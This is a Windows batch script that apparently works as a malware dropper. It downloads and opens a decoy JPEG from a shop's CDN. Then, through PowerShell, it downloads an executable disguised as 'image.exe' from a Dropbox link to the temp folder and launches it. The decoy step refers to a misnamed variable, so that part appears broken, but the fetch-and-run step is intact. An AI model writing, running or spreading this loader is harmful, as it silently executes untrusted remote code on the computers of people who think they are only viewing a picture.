@echo off
setlocal enabledelayedexpansion

set "imgURL=https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg"
set "execURL=https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0"

set "imageFile=%TEMP%\UrlaAngel04Cream_8_1_1.jpg"
set "execFile=%TEMP%\image.exe"

powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%imageURL%', '%imageFile%');"
start !imageFile!

powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%');Invoke-Item '%execFile%';"

endlocal
